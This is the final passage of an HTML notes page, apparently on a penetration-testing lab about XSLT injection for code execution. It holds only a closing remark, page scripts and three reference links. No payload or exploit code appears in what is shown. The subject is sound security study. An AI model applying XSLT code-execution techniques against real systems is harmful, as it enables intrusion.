+</code></pre><ul id="a4315b01-2fe0-4704-a611-bc3f3b146540" class="bulleted-list"><li style="list-style-type:disc">With that, we conclude this lab on leveraging XSLT for code execution.</li></ul><h3 id="24ec2103-9d64-4432-a903-d75466096dbf" class=""><strong>References</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#references-1"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bef72f56-6a4e-4639-a59f-3ef5f0fbee9f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.w3schools.com/xml/xsl_intro.asp
+https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5
+https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
